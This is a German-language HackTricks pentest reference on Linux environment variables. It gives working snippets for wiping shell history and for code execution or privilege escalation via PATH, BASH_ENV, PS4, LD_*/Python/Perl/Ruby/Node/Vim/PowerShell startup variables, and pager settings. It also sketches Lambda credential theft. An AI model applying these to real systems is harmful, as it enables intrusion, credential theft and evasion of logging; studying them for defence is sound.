# Linux-Umgebungsvariablen

{{#include ../../banners/hacktricks-training.md}}

## Globale Variablen

Die globalen Variablen **werden** von **Kindprozessen** geerbt.

Du kannst eine globale Variable für deine aktuelle Sitzung erstellen mit:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Diese Variable ist in Ihren aktuellen Sitzungen und deren untergeordneten Prozessen verfügbar.

Sie können eine Variable mit folgendem Befehl **entfernen**:
```bash
unset MYGLOBAL
```
## Lokale Variablen

Auf die **lokalen Variablen** kann nur von der **aktuellen Shell/dem aktuellen Script** **zugegriffen** werden.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Aktuelle Variablen auflisten
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Die Inhalte von `/proc/*/environ` sind durch **NUL** getrennt, daher sind diese Varianten normalerweise leichter zu lesen:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Wenn du nach **credentials** oder einer **interessanten service configuration** in geerbten Umgebungen suchst, prüfe auch [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Häufige Variablen

Quelle: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – das von **X** verwendete Display. Diese Variable wird normalerweise auf **:0.0** gesetzt, was das erste Display auf dem aktuellen Computer bedeutet.
- **EDITOR** – der vom Benutzer bevorzugte Texteditor.
- **HISTFILESIZE** – die maximale Anzahl von Zeilen, die in der history file enthalten sein dürfen.
- **HISTSIZE** – Anzahl der Zeilen, die der history file hinzugefügt werden, wenn der Benutzer seine Sitzung beendet
- **HOME** – dein Home-Verzeichnis.
- **HOSTNAME** – der Hostname des Computers.
- **LANG** – deine aktuelle Sprache.
- **MAIL** – der Speicherort der Mail-Spool des Benutzers. Normalerweise **/var/spool/mail/USER**.
- **MANPATH** – die Liste der Verzeichnisse, die nach manual pages durchsucht werden.
- **OSTYPE** – der Typ des Betriebssystems.
- **PS1** – der Standard-Prompt in bash.
- **PATH** – speichert den Pfad aller Verzeichnisse, die binary files enthalten, die du ausführen möchtest, indem du einfach den Dateinamen und nicht den relativen oder absoluten Pfad angibst.
- **PWD** – das aktuelle Arbeitsverzeichnis.
- **SHELL** – der Pfad zur aktuellen command shell (zum Beispiel **/bin/bash**).
- **TERM** – der aktuelle Terminaltyp (zum Beispiel **xterm**).
- **TZ** – deine Zeitzone.
- **USER** – dein aktueller Benutzername.

## Interessante Variablen für Hacking

Nicht jede Variable ist gleichermaßen nützlich. Aus offensiver Sicht solltest du Variablen priorisieren, die **Suchpfade**, **Startup-Dateien**, das **Verhalten des dynamic linkers** oder **Audit-/Logging-Funktionen** ändern.

### **HISTFILESIZE**

Ändere den **Wert dieser Variable auf 0**, damit die **history file** (\~/.bash_history) beim **Beenden deiner Sitzung** auf **0 Zeilen gekürzt** wird.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Ändere den **Wert dieser Variable auf 0**, damit Befehle **nicht im Arbeitsspeicherverlauf gespeichert** und nicht in die **Verlaufsdatei** (\~/.bash_history) geschrieben werden.
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Wenn der **Wert dieser Variable auf `ignorespace` oder `ignoreboth` gesetzt ist**, wird jeder Befehl, dem ein zusätzliches Leerzeichen vorangestellt ist, nicht in der History gespeichert.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Setze die **history file** auf **`/dev/null`** oder hebe sie vollständig auf. Das ist normalerweise zuverlässiger, als nur die Größe des Verlaufs zu ändern.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Die Prozesse verwenden den hier angegebenen **proxy**, um über **http oder https** eine Verbindung zum Internet herzustellen.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: Standard-Proxy für Tools/Protokolle, die diese Variable berücksichtigen.
- `no_proxy`: Umgehungsliste (Hosts/Domains/CIDRs), die direkt eine Verbindung herstellen sollen.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Sowohl Klein- als auch Großschreibungsvarianten können je nach Tool verwendet werden (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Die Prozesse vertrauen den in **diesen Umgebungsvariablen** angegebenen Zertifikaten. Dies ist nützlich, damit Tools wie **`curl`**, **`git`**, Python-HTTP-Clients oder Paketmanager einer vom Angreifer kontrollierten CA vertrauen (beispielsweise, damit ein Interception-Proxy legitim erscheint).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Wenn ein privilegierter Wrapper/ein privilegiertes Script Befehle **ohne absolute Pfade** ausführt, gewinnt das **erste vom Angreifer kontrollierte Verzeichnis** in `PATH`. Dies ist das Grundprinzip hinter vielen **PATH hijacks** in `sudo`, Cron-Jobs, Shell-Wrappern und benutzerdefinierten SUID-Hilfsprogrammen. Achte auf `env_keep+=PATH`, einen schwachen `secure_path` oder Wrapper, die `tar`, `service`, `cp`, `python` usw. anhand ihres Namens aufrufen.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Für vollständige Privilege-Escalation-Ketten, die `PATH` missbrauchen, siehe [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` ist nicht nur eine Verzeichnisreferenz: Viele Tools laden automatisch **dotfiles**, **Plugins** und **benutzerbezogene Konfiguration** aus `$HOME` oder `$XDG_CONFIG_HOME`. Wenn ein privilegierter Workflow diese Werte beibehält, kann **config injection** einfacher sein als **binary hijacking**.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Interessante Ziele umfassen `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` und toolspezifische Dateien wie `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Diese Variablen beeinflussen den **dynamic linker**:

- `LD_PRELOAD`: erzwingt, dass zusätzliche shared objects zuerst geladen werden.
- `LD_LIBRARY_PATH`: stellt Bibliothekssuchverzeichnisse voran.
- `LD_AUDIT`: lädt Auditor-Bibliotheken, die das Laden von Bibliotheken und die Symbolauflösung beobachten.

Sie sind äußerst wertvoll für **hooking**, **instrumentation** und **privilege escalation**, wenn ein privilegierter Befehl sie beibehält. Im **secure-execution**-Modus (`AT_SECURE`, z. B. setuid/setgid/capabilities) entfernt oder beschränkt der Loader viele dieser Variablen. Parser-Bugs in dieser frühen Loader-Phase sind dennoch sehr wirkungsvoll, da sie **vor** dem Zielprogramm ausgeführt werden.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` verändert das frühe Verhalten von glibc (zum Beispiel die Tunables des Allokators) und ist in Exploit-Labs sehr nützlich. Aus Sicherheitsperspektive ist es ebenfalls relevant, da der **dynamische Loader die Variable sehr früh parst**. Der **Looney Tunables**-Bug von 2023 war eine gute Erinnerung daran, dass eine einzelne, im Loader geparste Umgebungsvariable zu einem **Local-Privilege-Escalation-Primitiv** gegen SUID-Programme werden kann.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Wenn **Bash** **nicht-interaktiv** gestartet wird, prüft es `BASH_ENV` und lädt diese Datei, bevor das Zielskript ausgeführt wird. Wenn Bash als `sh` oder im interaktiven POSIX-Modus aufgerufen wird, kann zusätzlich `ENV` berücksichtigt werden. Dies ist eine klassische Möglichkeit, einen Shell-Wrapper in Codeausführung zu verwandeln, wenn die Umgebung von einem Angreifer kontrolliert wird.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash ignoriert diese Startdateien, wenn die **realen/effektiven IDs unterschiedlich sind**; `-p` bewahrt die effektive ID, aktiviert diese Startdateien jedoch nicht. Das genaue Verhalten hängt daher davon ab, wie der Wrapper die Shell startet. Seien Sie vorsichtig bei privilegierten Wrappern, die **vor** dem Start von Bash `setuid()`/`setgid()` aufrufen: Sobald die IDs wieder übereinstimmen, vertraut Bash möglicherweise `BASH_ENV`, `ENV` und dem zugehörigen Shell-Zustand, die andernfalls ignoriert würden.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Wenn Bash mit aktiviertem **xtrace** läuft, erweitert es `PS4` und gibt es vor jedem nachverfolgten Befehl aus. `PS4` wird wie ein Prompt erweitert, sodass eine darin enthaltene **command substitution** ausgeführt wird. Entscheidend ist, dass xtrace allein über die Umgebung aktiviert werden kann, indem `SHELLOPTS=xtrace` exportiert wird — `-x` in der Befehlszeile ist nicht erforderlich — und somit jedes Bash-Skript, das das Opfer ausführt, zur Codeausführung wird.<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` bewirkt nichts, bis xtrace aktiv ist (`SHELLOPTS=xtrace`, `set -x` oder `bash -x`), und Bash entfernt `SHELLOPTS` in privilegierten/setuid-Kontexten genauso wie `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONBREAKPOINT**

Diese Variablen ändern, wie Python startet:

- `PYTHONPATH`: Import-Suchpfade voranstellen.
- `PYTHONHOME`: Den Verzeichnisbaum der Standardbibliothek verlagern.
- `PYTHONSTARTUP`: Eine Datei vor der interaktiven Eingabeaufforderung ausführen.
- `PYTHONINSPECT=1`: Nach Abschluss eines Skripts in den interaktiven Modus wechseln.
- `PYTHONBREAKPOINT`: `package.module.callable`, das aufgerufen wird (und dessen Modul importiert wird), wenn der Code `breakpoint()` erreicht.<sup>[[8]](#references)</sup>

Sie sind nützlich gegen Wartungsskripte, Debugger, Shells und Wrapper, die Python mit einer kontrollierbaren Umgebung aufrufen. `python -E` und `python -I` ignorieren alle `PYTHON*`-Variablen.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
Ein aktuelles Beispiel aus der Praxis war die **needrestart**-LPE von 2024 auf Ubuntu-/Debian-Systemen: Der Scanner mit Root-Berechtigungen kopierte das `PYTHONPATH` eines nicht privilegierten Prozesses aus `/proc/<PID>/environ` und führte anschließend Python aus. Der veröffentlichte Exploit platzierte `importlib/__init__.so` im vom Angreifer kontrollierten Pfad, sodass Python während seiner eigenen Initialisierung Angreifer-Code ausführte, bevor das fest codierte Skript des Helpers überhaupt eine Rolle spielte.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl verfügt über ebenso nützliche Startup-Variablen:

- `PERL5LIB`: stellt Bibliotheksverzeichnisse voran.
- `PERL5OPT`: injiziert Schalter, als stünden sie in jeder `perl`-Befehlszeile.

Dies kann das **automatische Laden von Modulen** erzwingen oder das Verhalten des Interpreters ändern, bevor das Zielskript etwas Interessantes ausführt. Perl ignoriert diese Variablen in **taint / setuid / setgid**-Kontexten, aber sie sind weiterhin für normale als Root ausgeführte Wrapper, CI-Jobs, Installer und benutzerdefinierte sudoers-Regeln sehr relevant.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` stellt jedem `node`-Prozess, der die Umgebung erbt, **Node.js-CLI-Flags** voran. Dadurch ist es nützlich gegen Wrapper, CI-Jobs, Electron-Hilfsprozesse und sudo-Regeln, die letztendlich Node aufrufen. Die offensiv interessantesten Flags sind üblicherweise:

- `--require <file>`: lädt eine CommonJS-Datei vor dem Zielskript vor.
- `--import <module>`: lädt ein ES-Modul vor dem Zielskript vor.

Node lehnt einige gefährliche Flags in `NODE_OPTIONS` ab, aber `--require` und `--import` sind ausdrücklich erlaubt und werden **vor** den regulären Befehlszeilenargumenten verarbeitet.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### Fileless preload mit einer `data:`-URL

Wenn du `NODE_OPTIONS` setzen kannst, aber **keine Datei** auf dem Zielsystem schreiben kannst (Dateisystem nur zum Lesen, eingeschränkte API, Serverless-Runtime usw.), akzeptiert `--import` eine `data:text/javascript,`-URL, sodass die gesamte Nutzlast direkt in der Umgebungsvariable übertragen wird. Das JavaScript muss **vollständig URL-enkodiert** sein — Node analysiert den Wert als URL, sodass jedes rohe Leerzeichen (oder ein anderes nicht enkodiertes Zeichen) die Nutzlast abschneidet und einen `SyntaxError` auslöst. Dies funktioniert unter Node 20.6 und höher, wo `--import` auf der `NODE_OPTIONS`-Allowlist steht.<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> Dies ist eine gängige Methode, um die Kontrolle über `NODE_OPTIONS` in RCE auf **managed cloud runtimes** umzuwandeln, deren Funktionen Node ausführen. Beispielsweise kann ein Angreifer, der nur die Konfiguration einer Lambda ändern kann (`lambda:UpdateFunctionConfiguration`, kein `iam:PassRole`, kein Code-Update), `NODE_OPTIONS=--import data:text/javascript,<payload>` einschleusen, um Code innerhalb der Funktion auszuführen und die Credentials ihrer Execution Role zu stehlen. Das eingeschleuste Modul wird **vor** dem Handler ausgeführt, der danach weiterhin normal läuft.

Bei entfernten Gadget Chains, die `NODE_OPTIONS` indirekt setzen (beispielsweise durch prototype pollution zu RCE), siehe [diese andere Seite](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby bietet dieselbe Klasse von Missbrauch beim Start:

- `RUBYLIB`: Stellt Verzeichnisse dem Load Path von Ruby voran.
- `RUBYOPT`: Schränkt in jede `ruby`-Ausführung Kommandozeilenoptionen wie `-r` ein.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Die **needrestart**-Schwachstellen von 2024 zeigten, dass dies nicht nur ein Lab-Trick ist: Derselbe root-eigene Helper, der für `PYTHONPATH`-Missbrauch anfällig war, konnte auch dazu gebracht werden, Ruby mit einem vom Angreifer kontrollierten `RUBYLIB` auszuführen und `enc/encdb.so` aus einem vom Angreifer kontrollierten Verzeichnis zu laden.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim führen die in `VIMINIT` (oder dessen `EXINIT`-Fallback) enthaltenen Ex-Befehle während eines normalen Starts aus. Zu den Ex-Befehlen gehören `:!cmd` und `:call system(...)`; durch die Kontrolle der Variable lässt sich daher Code ausführen, sobald ein Opfer Vim öffnet (ein `sudo vim` als root, `crontab -e`, `visudo`, `git`/`less`, die `$EDITOR` starten, usw.).<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
Der Batch-Modus (`vim -es`/`-Es`) überspringt diese Variablen, aber ein normaler interaktiver Start führt sie aus.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) läuft unter Linux/macOS (und Windows) und ist eine **.NET-Anwendung**. Daher ermöglichen mehrere Umgebungsvariablen, dass jeder `pwsh`-Aufruf mit einer geerbten Umgebung Code ausführt — nützlich gegen cron/systemd-Jobs, CI runner und privilegierte Wrapper, die `pwsh` aufrufen.

- `PSModulePath`: PowerShell durchsucht rekursiv jedes Verzeichnis in dieser Liste nach `.psd1`-/`.psm1`-Modulen und **lädt eines automatisch**, sobald erstmals auf einen von ihm exportierten Befehl verwiesen wird. Stelle ein Verzeichnis voran, und der Top-Level-Code deines Moduls wird zum Zeitpunkt des Imports ausgeführt; da die Auflösung *Alias → Function → Cmdlet* lautet, kann eine exportierte Funktion sogar ein integriertes Cmdlet überschreiben, das das Opfer aufruft.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: verschiebt `powershell/Microsoft.PowerShell_profile.ps1`, das beim Start ausgeführt wird (außer bei `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: verwaltete Assembly, deren `StartupHook.Initialize()` vor `Main` ausgeführt wird (von jeder .NET-Anwendung gemeinsam genutzt).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: Die CLR profiling API lädt beim Start eine Angreifer-Bibliothek in den Prozess (Pfadvariablen haben Vorrang vor der Registry; `DOTNET_*` ist der neuere Alias). Unter Windows PowerShell 5.1 (.NET Framework) verwende `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
Unter Windows entfernt `PSExecutionPolicyPreference=Bypass` zusätzlich den Schutzmechanismus „unsigned scripts blocked“, sodass ein platziertes Profil/Modul tatsächlich ausgeführt wird. Auf der entsprechenden Seite findest du vollständige PoCs:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Einige Tools lesen nicht einfach nur einen Pfad aus der Umgebung; sie übergeben den Wert an eine **shell**, einen **editor** oder einen **input preprocessor**. Dadurch sind die folgenden Variablen besonders interessant, wenn ein privilegierter Wrapper `git`, `man`, `less` oder ähnliche Text-Viewer ausführt:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: Legen den Pager-Befehl fest.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: Legen den Editor-Befehl fest, häufig einschließlich Argumenten.
- `LESSOPEN`, `LESSCLOSE`: Definieren Pre-/Postprozessoren, die ausgeführt werden, wenn `less` eine Datei öffnet.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git unterstützt außerdem die **ausschließlich über Umgebungsvariablen erfolgende Konfigurationsinjektion**, ohne den Datenträger zu verändern, über `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` und `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Aus der Perspektive von post-exploitation solltest du außerdem bedenken, dass geerbte Umgebungen häufig **credentials**, **proxy settings**, **service tokens** oder **cloud keys** enthalten. Siehe [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) für die Suche nach `/proc/<PID>/environ` und `systemd`-`Environment=`.

### PS1

Ändere das Aussehen deines Prompts.

[**Dies ist ein Beispiel**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Dies ist ein Beispiel](<../images/image (897).png>)

Regulärer Benutzer:

![PERL5OPT & PERL5LIB - PS1: Ein, zwei und drei Hintergrundjobs](<../images/image (740).png>)

Ein, zwei und drei Hintergrundjobs:

![PERL5OPT & PERL5LIB - PS1: Ein, zwei und drei Hintergrundjobs](<../images/image (145).png>)

Ein Hintergrundjob, einer angehalten und der letzte Befehl wurde nicht korrekt beendet:

![PERL5OPT & PERL5LIB - PS1: Ein Hintergrundjob, einer angehalten und der letzte Befehl wurde nicht korrekt beendet](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash-Startdateien](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js-CLI-Dokumentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Häufige Umgebungsvariablen - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Lokale Rechteausweitung in glibcs ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash Manual - Bash-Variablen (`PS4`) und das Set-Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Integrierter breakpoint() und PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim-Dokumentation - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath und automatisches Laden von PowerShell-Modulen](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET-Debugging- und Profiling-Konfigurationseinstellungen (`CORECLR_`/`DOTNET_`/`COR_`-Profiler-Variablen)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
